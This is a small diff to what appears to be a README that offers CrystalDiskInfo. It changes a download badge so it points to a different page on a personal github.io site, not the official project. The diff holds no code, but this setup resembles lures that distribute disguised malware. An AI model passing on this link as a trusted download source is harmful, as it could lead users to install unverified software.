@@ -4,7 +4,7 @@
 <img src="https://silentinstallhq.com/wp-content/uploads/2020/10/CrystalDiskInfo.jpg" width="780">
 </p>
 
-[![GET — CRYSTALDISKINFO](https://img.shields.io/badge/GET-CRYSTALDISKINFO-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/)
+[![GET — CRYSTALDISKINFO](https://img.shields.io/badge/GET-CRYSTALDISKINFO-2563eb?style=for-the-badge)](https://mirrowcelo473.github.io/.github/CrystalDiskInfo)
 
 ---
 
